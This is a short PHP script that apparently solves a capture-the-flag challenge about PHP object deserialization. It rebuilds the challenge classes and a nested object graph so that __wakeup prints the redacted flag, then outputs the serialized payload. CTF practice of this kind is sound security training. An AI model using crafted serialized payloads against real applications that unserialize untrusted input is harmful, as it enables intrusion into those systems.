<?php


class First{
    public $foo;
    public function foo(){
        return $this->foo->current();
    }
}

class Second{
    public $foo = false;

    public function foo(){
        if ($this->foo)
            return true;

    }
}

class Serializer
{
    public function __construct()
    {
        $this->first = new First();
        $this->second = new Second();
    }

    public $first;
    public $second;

    public function __wakeup()
    {
        if ($this->first->foo()) {
            if ($this->second->foo()) {
                echo '2GIS.CTF{***REDACTED***}';
            }
        }
    }
}

$c = new Serializer();
$f = new First();
$s = new Second();
$f->foo = new ArrayIterator([true]);
$s->foo = true;
$c->first = $f;
$c->second = $s;
echo serialize($c)
?>
